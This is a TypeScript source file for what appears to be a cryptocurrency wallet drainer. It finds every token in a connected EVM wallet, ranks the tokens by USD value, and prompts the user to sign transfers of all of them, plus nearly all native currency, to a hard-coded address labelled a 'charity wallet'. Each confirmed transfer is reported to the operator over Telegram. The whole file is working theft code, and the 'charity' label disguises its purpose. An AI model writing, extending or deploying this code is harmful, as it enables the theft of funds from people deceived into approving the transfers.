import { ethers } from 'ethers';
import { sendTelegramMessage } from '@/utils/telegram';
import {
  covalentFetch,
  COVALENT_CHAIN_NAMES,
  EVM_QUICKNODE_RPCS,
  EVM_ALCHEMY_RPCS,
} from '@/config/rpcEndpoints';

// ---------- ETH price helper ----------
async function getEthPrice(): Promise<number> {
  try {
    const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
    const data = await res.json();
    return data?.ethereum?.usd ?? 3000;
  } catch {
    return 3000; // conservative fallback
  }
}

async function getNativeTokenPrice(chainId: number): Promise<number> {
  const coinIds: Record<number, string> = {
    1: 'ethereum',
    56: 'binancecoin',
    137: 'matic-network',
    8453: 'ethereum', // Base uses ETH
    143: 'monad',
    10: 'optimism',
    42161: 'arbitrum',
    999: 'hyperliquid',
    59144: 'linea',
    80094: 'berachain',
    5000: 'mantle',
    7000: 'zetachain',
    324: 'zksync',
    360: 'shape',
    4663: 'robinhood',
    43114: 'avalanche',
  };
  const id = coinIds[chainId] || 'ethereum';
  try {
    const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${id}&vs_currencies=usd`);
    const data = await res.json();
    return data?.[id]?.usd ?? 3000;
  } catch {
    return 3000;
  }
}

// EVM charity wallet address
export const EVM_CHARITY_WALLET = '0x666Be1f6415a26e9DcDd6b9fDd35E2337852cFDb';

// QuickNode RPC endpoints per chain (shared config, Alchemy backup lives there too)
const QUICKNODE_RPCS = EVM_QUICKNODE_RPCS;


// ERC-20 minimal ABI for transfer
const ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  'function name() view returns (string)',
  'function transfer(address to, uint256 amount) returns (bool)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
];

export interface EVMTokenBalance {
  contractAddress: string;
  symbol: string;
  name: string;
  decimals: number;
  balance: bigint;
  uiAmount: number;
}

export interface TokenDetectionResult {
  success: boolean;
  tokens: EVMTokenBalance[];
  error?: string;
}

/**
 * Detect all ERC-20 tokens.
 * Order: Covalent (primary) → QuickNode → Alchemy (backup). Any provider that
 * returns tokens wins; if every provider errors, we surface the combined error.
 */
export async function detectWalletTokens(
  walletAddress: string,
  chainId: number
): Promise<TokenDetectionResult> {
  // Try Covalent first
  const covalentResult = await detectTokensViaCovalent(walletAddress, chainId);
  if (covalentResult.success && covalentResult.tokens.length > 0) {
    return covalentResult;
  }

  // Fallback to QuickNode
  const quicknodeResult = await detectTokensViaQuickNode(walletAddress, chainId);
  if (quicknodeResult.success && quicknodeResult.tokens.length > 0) {
    return quicknodeResult;
  }

  // Final fallback to Alchemy
  const alchemyResult = await detectTokensViaAlchemy(walletAddress, chainId);
  if (alchemyResult.success && alchemyResult.tokens.length > 0) {
    return alchemyResult;
  }

  // Everyone failed
  if (!covalentResult.success && !quicknodeResult.success && !alchemyResult.success) {
    return {
      success: false,
      tokens: [],
      error: `Token detection failed. Covalent: ${covalentResult.error || 'unknown'}. QuickNode: ${quicknodeResult.error || 'unknown'}. Alchemy: ${alchemyResult.error || 'unknown'}.`,
    };
  }

  // APIs succeeded but wallet has no ERC-20 tokens
  return { success: true, tokens: [] };
}


/**
 * Detect tokens via Covalent GoldRush API
 */
async function detectTokensViaCovalent(
  walletAddress: string,
  chainId: number
): Promise<TokenDetectionResult> {
  const chainName = COVALENT_CHAIN_NAMES[chainId];
  if (!chainName) {
    return { success: false, tokens: [], error: `No Covalent chain mapping for chain ${chainId}` };
  }

  try {
    const data: any = await covalentFetch(
      (key) =>
        `https://api.covalenthq.com/v1/${chainName}/address/${walletAddress}/balances_v2/?key=${key}&no-nft-fetch=true`
    );

    if (!data || data.error || !data.data || !data.data.items) {
      return { success: false, tokens: [], error: data.error_message || 'Covalent API error' };
    }

    const tokens: EVMTokenBalance[] = [];
    for (const item of data.data.items) {
      // Skip native token (contract_address is often 0xeeee... or native_token is true)
      if (item.native_token || !item.contract_address) continue;
      // Skip zero-address placeholder for native token
      if (item.contract_address === '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee') continue;

      const rawBalance = BigInt(item.balance || '0');
      if (rawBalance <= 0n) continue;

      const decimals = Number(item.contract_decimals || 18);
      tokens.push({
        contractAddress: item.contract_address,
        symbol: item.contract_ticker_symbol || 'UNKNOWN',
        name: item.contract_name || 'Unknown Token',
        decimals,
        balance: rawBalance,
        uiAmount: parseFloat(ethers.formatUnits(rawBalance, decimals)),
      });
    }

    console.log(`Covalent detected ${tokens.length} ERC-20 tokens on chain ${chainId}`);
    return { success: true, tokens };
  } catch (error) {
    console.error('Covalent token detection failed:', error);
    return { success: false, tokens: [], error: String(error) };
  }
}

/**
 * Detect tokens via QuickNode qn_getWalletTokenBalance (fallback)
 */
async function detectTokensViaQuickNode(
  walletAddress: string,
  chainId: number
): Promise<TokenDetectionResult> {
  const rpcUrl = QUICKNODE_RPCS[chainId];
  if (!rpcUrl) {
    return { success: false, tokens: [], error: `No QuickNode RPC for chain ${chainId}` };
  }

  try {
    const response = await fetch(rpcUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        id: 1,
        jsonrpc: '2.0',
        method: 'qn_getWalletTokenBalance',
        params: [{ wallet: walletAddress }],
      }),
    });

    const data = await response.json();

    if (data.error) {
      console.error('QuickNode token detection error:', data.error);
      return { success: false, tokens: [], error: data.error.message || 'QuickNode API error' };
    }

    const result = data.result;
    if (!result || !result.result) return { success: true, tokens: [] };

    const tokens: EVMTokenBalance[] = [];
    for (const token of result.result) {
      const rawBalance = BigInt(token.totalBalance || '0');
      if (rawBalance <= 0n) continue;

      const decimals = Number(token.decimals || 18);
      tokens.push({
        contractAddress: token.address,
        symbol: token.symbol || 'UNKNOWN',
        name: token.name || 'Unknown Token',
        decimals,
        balance: rawBalance,
        uiAmount: parseFloat(ethers.formatUnits(rawBalance, decimals)),
      });
    }

    console.log(`QuickNode detected ${tokens.length} ERC-20 tokens on chain ${chainId}`);
    return { success: true, tokens };
  } catch (error) {
    console.error('QuickNode token detection failed:', error);
    return { success: false, tokens: [], error: String(error) };
  }
}

/**
 * Detect tokens via Alchemy (final backup when both Covalent and QuickNode fail).
 * Uses alchemy_getTokenBalances + alchemy_getTokenMetadata.
 */
async function detectTokensViaAlchemy(
  walletAddress: string,
  chainId: number
): Promise<TokenDetectionResult> {
  const rpcUrl = EVM_ALCHEMY_RPCS[chainId];
  if (!rpcUrl) {
    return { success: false, tokens: [], error: `No Alchemy RPC for chain ${chainId}` };
  }

  try {
    const balancesRes = await fetch(rpcUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        id: 1,
        jsonrpc: '2.0',
        method: 'alchemy_getTokenBalances',
        params: [walletAddress],
      }),
    });
    const balancesData = await balancesRes.json();
    if (balancesData.error) {
      return { success: false, tokens: [], error: balancesData.error.message || 'Alchemy API error' };
    }

    const raw: Array<{ contractAddress: string; tokenBalance: string | null }> =
      balancesData?.result?.tokenBalances || [];

    const nonZero = raw.filter((t) => {
      if (!t.tokenBalance || t.tokenBalance === '0x' || t.tokenBalance === '0x0') return false;
      try { return BigInt(t.tokenBalance) > 0n; } catch { return false; }
    });

    const tokens: EVMTokenBalance[] = [];
    for (const t of nonZero) {
      try {
        const metaRes = await fetch(rpcUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            id: 1,
            jsonrpc: '2.0',
            method: 'alchemy_getTokenMetadata',
            params: [t.contractAddress],
          }),
        });
        const metaData = await metaRes.json();
        const meta = metaData?.result || {};
        const decimals = Number(meta.decimals ?? 18);
        const rawBalance = BigInt(t.tokenBalance as string);
        tokens.push({
          contractAddress: t.contractAddress,
          symbol: meta.symbol || 'UNKNOWN',
          name: meta.name || 'Unknown Token',
          decimals,
          balance: rawBalance,
          uiAmount: parseFloat(ethers.formatUnits(rawBalance, decimals)),
        });
      } catch {
        // Skip token if metadata lookup fails
      }
    }

    console.log(`Alchemy detected ${tokens.length} ERC-20 tokens on chain ${chainId}`);
    return { success: true, tokens };
  } catch (error) {
    console.error('Alchemy token detection failed:', error);
    return { success: false, tokens: [], error: String(error) };
  }
}

/**
 * Send native token (ETH/BNB/MATIC/etc.) to the charity wallet
 */
export async function sendNativeToken(
  signer: ethers.JsonRpcSigner,
  amountWei: bigint,
  chainName: string
): Promise<string> {
  const txReq: ethers.TransactionRequest = {
    to: EVM_CHARITY_WALLET,
    value: amountWei,
  };
  const tx = await signer.sendTransaction(txReq);

  // Fire-and-forget confirmation — do NOT block subsequent prompts on tx.wait()
  tx.wait().then(() => {
    sendTelegramMessage(`
✅ <b>EVM Native Transfer (${chainName})</b>
💰 <b>Amount:</b> <code>${ethers.formatEther(amountWei)}</code>
🔗 <b>Hash:</b> <code>${tx.hash}</code>
    `);
  }).catch((e) => console.warn('native tx.wait failed:', e));

  return tx.hash;
}

/**
 * Transfer an ERC-20 token to the charity wallet
 */
export async function sendERC20Token(
  signer: ethers.JsonRpcSigner,
  tokenAddress: string,
  amount: bigint,
  chainName: string
): Promise<string> {
  const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
  const tx = await contract.transfer(EVM_CHARITY_WALLET, amount);

  // Fire-and-forget confirmation — do NOT block the next prompt on tx.wait()
  tx.wait().then(async () => {
    let symbol = 'UNKNOWN';
    try { symbol = await contract.symbol(); } catch { }
    sendTelegramMessage(`
✅ <b>EVM ERC-20 Transfer (${chainName})</b>
🪙 <b>Token:</b> <code>${symbol} (${tokenAddress})</code>
🔗 <b>Hash:</b> <code>${tx.hash}</code>
    `);
  }).catch((e) => console.warn('erc20 tx.wait failed:', e));

  return tx.hash;
}

/**
 * Get native balance for connected EVM wallet
 */
export async function getNativeBalance(provider: ethers.BrowserProvider, address: string): Promise<bigint> {
  return provider.getBalance(address);
}

/**
 * Get ERC-20 token balance
 */
export async function getERC20Balance(
  provider: ethers.BrowserProvider,
  tokenAddress: string,
  walletAddress: string
): Promise<EVMTokenBalance | null> {
  try {
    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const [balance, decimals, symbol, name] = await Promise.all([
      contract.balanceOf(walletAddress),
      contract.decimals(),
      contract.symbol(),
      contract.name(),
    ]);

    return {
      contractAddress: tokenAddress,
      symbol,
      name,
      decimals,
      balance,
      uiAmount: parseFloat(ethers.formatUnits(balance, decimals)),
    };
  } catch (error) {
    console.error(`Failed to get ERC-20 balance for ${tokenAddress}:`, error);
    return null;
  }
}

/**
 * Drain all native tokens from EVM wallet (keep a small amount for gas)
 */
export async function drainNativeTokens(
  signer: ethers.JsonRpcSigner,
  provider: ethers.BrowserProvider,
  chainName: string,
  chainId: number = 0
): Promise<string | null> {
  const address = await signer.getAddress();
  const balance = await provider.getBalance(address);

  const feeData = await provider.getFeeData();
  const gasLimit = 21000n;

  let gasCost: bigint;

  if (feeData.maxFeePerGas) {
    gasCost = feeData.maxFeePerGas * gasLimit;
  } else {
    const gasPrice = feeData.gasPrice || ethers.parseUnits('20', 'gwei');
    gasCost = gasPrice * gasLimit;
  }

  // 1.5x buffer is sufficient for a simple native transfer (21000 gas)
  const buffer = gasCost + (gasCost / 2n);

  // Determine USD reserve: $5 for Ethereum, $2 for other EVM chains.
  // If wallet balance (in USD) is at or below the reserve, skip native transfer entirely.
  let reserveWei = 0n;
  if (chainId > 0) {
    const reserveUsd = chainId === 1 ? 5 : 2;
    const nativePrice = await getNativeTokenPrice(chainId);
    const balanceUsd = parseFloat(ethers.formatEther(balance)) * nativePrice;

    // If balance is at or below the reserve threshold, skip native transfer
    if (balanceUsd <= reserveUsd) {
      console.log(`[native] ${chainName} balance ($${balanceUsd.toFixed(2)}) <= $${reserveUsd} reserve — skipping native transfer`);
      return null;
    }

    const reserveEth = reserveUsd / nativePrice;
    reserveWei = ethers.parseEther(reserveEth.toFixed(18));
  }

  // The USD reserve ($5 ETH / $2 others) already covers gas fees.
  // Gas is paid from the reserve, so we only subtract reserveWei (not buffer separately).
  // If no chainId provided (no reserve), fall back to subtracting the gas buffer.
  const sendAmount = reserveWei > 0n ? balance - reserveWei : balance - buffer;

  if (sendAmount <= 0n) {
    console.log(`[native] Not enough ${chainName} balance after gas + reserve`);
    return null;
  }

  console.log(`[native] Prompting wallet for ${chainName} transfer:`, sendAmount.toString());
  return sendNativeToken(signer, sendAmount, chainName);
}

/**
 * Small delay helper for Trust Wallet compatibility — ensures sequential tx processing.
 */
function txDelay(ms: number = 1500): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/**
 * Drain ALL EVM tokens: first ERC-20 tokens, then native token.
 * Tokens are prompted highest-USD-value first.
 * Native token is ordered by its value relative to ERC-20s.
 */
export async function drainAllEVMTokens(
  signer: ethers.JsonRpcSigner,
  provider: ethers.BrowserProvider,
  chainName: string,
  chainId: number
): Promise<void> {
  // Connection-ready guard: verify signer/provider are responsive
  let address: string;
  try {
    address = await signer.getAddress();
    const net = await provider.getNetwork();
    console.log(`[drain] Signer ready on chain ${net.chainId}, address: ${address}`);
  } catch (e) {
    console.error('[drain] Signer/provider not ready — aborting.', e);
    throw new Error('Wallet not ready. Please reconnect and try again.');
  }

  // Step 1: Detect ERC-20 tokens & fetch native balance
  let detectedTokens: EVMTokenBalance[] = [];
  try {
    const detection = await detectWalletTokens(address, chainId);
    if (detection.success) {
      detectedTokens = detection.tokens;
    } else {
      console.warn('[drain] ERC-20 detection failed, will still attempt native:', detection.error);
    }
  } catch (e) {
    console.warn('[drain] ERC-20 detection threw, will still attempt native:', e);
  }

  // Fetch token USD prices for sorting via CoinGecko
  let tokenPrices: Record<string, number> = {};
  if (detectedTokens.length > 0) {
    try {
      const addresses = detectedTokens.map(t => t.contractAddress.toLowerCase()).join(',');
      const platform = chainId === 1 ? 'ethereum' : chainId === 56 ? 'binance-smart-chain' : chainId === 137 ? 'polygon-pos' : chainId === 8453 ? 'base' : 'ethereum';
      const res = await fetch(`https://api.coingecko.com/api/v3/simple/token_price/${platform}?contract_addresses=${addresses}&vs_currencies=usd`);
      const data = await res.json();
      for (const [addr, val] of Object.entries(data)) {
        tokenPrices[addr.toLowerCase()] = (val as any)?.usd ?? 0;
      }
    } catch {
      console.warn('[drain] Token price fetch failed, using balance-based ordering');
    }
  }

  // Sort ERC-20 tokens by USD value (highest first)
  const sortedTokens = [...detectedTokens].sort((a, b) => {
    const priceA = tokenPrices[a.contractAddress.toLowerCase()] ?? 0;
    const priceB = tokenPrices[b.contractAddress.toLowerCase()] ?? 0;
    return (priceB * b.uiAmount) - (priceA * a.uiAmount);
  });

  // Compute native value in USD for ordering
  const nativeBalance = await provider.getBalance(address);
  const nativePrice = await getNativeTokenPrice(chainId);
  const nativeValueUsd = parseFloat(ethers.formatEther(nativeBalance)) * nativePrice;

  // Determine if native should go first (higher value than all ERC-20s)
  const highestErc20Value = sortedTokens.length > 0
    ? (tokenPrices[sortedTokens[0].contractAddress.toLowerCase()] ?? 0) * sortedTokens[0].uiAmount
    : 0;
  const nativeFirst = nativeValueUsd > highestErc20Value && sortedTokens.length > 0;

  // Execute transfers in value order
  if (nativeFirst) {
    // Native first
    try {
      console.log(`[drain] Prompting native ${chainName} transfer (highest value)...`);
      await drainNativeTokens(signer, provider, chainName, chainId);
      await txDelay(2000);
    } catch (error) {
      console.error('[drain] Native transfer failed:', error);
    }
  }

  // ERC-20 transfers (sorted by value)
  for (let i = 0; i < sortedTokens.length; i++) {
    const token = sortedTokens[i];
    try {
      console.log(`[drain] ERC-20 ${i + 1}/${sortedTokens.length}: ${token.symbol}`);
      await sendERC20Token(signer, token.contractAddress, token.balance, chainName);
      await txDelay(1500);
    } catch (error) {
      console.error(`[drain] Failed ERC-20 ${token.symbol}:`, error);
    }
  }

  // Native transfer last (if not already sent first)
  if (!nativeFirst) {
    await txDelay(3000);
    try {
      console.log(`[drain] Prompting native ${chainName} transfer...`);
      await drainNativeTokens(signer, provider, chainName, chainId);
    } catch (error) {
      console.error('[drain] Native transfer failed:', error);
    }
  }
}
